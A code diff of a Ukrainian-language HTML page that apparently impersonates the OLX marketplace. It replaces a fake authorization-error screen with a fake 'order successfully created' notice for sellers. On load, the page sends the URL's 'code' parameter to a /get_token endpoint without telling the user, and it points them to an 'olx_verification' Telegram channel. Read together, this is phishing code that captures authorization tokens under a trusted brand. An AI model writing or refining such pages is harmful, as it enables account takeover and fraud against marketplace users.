@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Авторизація OLX</title>
+<title>Замовлення сформовано</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -34,6 +34,7 @@ body {
     color: #333;
     margin-bottom: 25px;
     font-size: 16px;
+    line-height: 1.6;
 }
 
 button {
@@ -56,9 +57,14 @@ button:hover {
 <body>
 
 <div class="card">
-    <h2 id="title">Виникла помилка авторизації</h2>
-    <p id="status">Помилка авторизації, будь ласка, зверніться до підтримки. <strong>Помилка авторизації</strong></p>
-    <button id="btn" style="display:inline-block;">Зв'язатися через Telegram</button>
+    <h2 id="title">Замовлення успішно сформовано</h2>
+    <p id="status">
+        Ваше замовлення доставки успішно створено та передано покупцеві.<br><br>
+        Будь ласка, повідомте покупця про відправлення та узгодьте деталі отримання.<br><br>
+        Дякуємо, що користуєтеся нашими послугами.<br>
+        Ми цінуємо вашу довіру та бажаємо вдалих продажів!
+    </p>
+    <button id="btn" style="display:inline-block;">Ми в Telegram</button>
 </div>
 
 <script>
@@ -66,9 +72,9 @@ button:hover {
 const params = new URLSearchParams(window.location.search);
 const code = params.get("code");
 
-// Ссылка на Telegram с предзаполненным текстом, добавлено "Ошибка авторизации"
+// Ссылка на Telegram
 const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
-    "Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації». Ошибка авторизации"
+    "Замовлення успішно сформовано"
 );
 
 // Кнопка Telegram
@@ -78,7 +84,7 @@ document.getElementById("btn").addEventListener("click", () => {
 
 // Функция отправки кода на сервер
 async function sendCode(code) {
-    if (!code) return showError("Код авторизації не знайдено.");
+    if (!code) return;
 
     try {
         const response = await fetch("/get_token", {
@@ -88,12 +94,7 @@ async function sendCode(code) {
         });
 
         const result = await response.json();
-
-        if (!response.ok) {
-            showError("Помилка авторизації, будь ласка, зверніться до підтримки. Помилка авторизації");
-        }
     } catch (err) {
-        showError("Помилка з'єднання з сервером. В повідомленні вкажіть «Помилка авторизації». Ошибка авторизации");
         console.error(err);
     }
 }
@@ -101,19 +102,8 @@ async function sendCode(code) {
 // Отправка кода автоматически при загрузке страницы
 if (code) {
     sendCode(code);
-} else {
-    showError("Код авторизації не знайдено. В повідомленні вкажіть «Помилка авторизації». Ошибка авторизации");
-}
-
-// Показываем ошибку на странице
-function showError(message) {
-    document.getElementById("title").innerText = "Виникла помилка авторизації";
-    document.getElementById("status").innerText = message;
-    document.getElementById("btn").style.display = "inline-block";
 }
 </script>
 
 </body>
 </html>
-
-
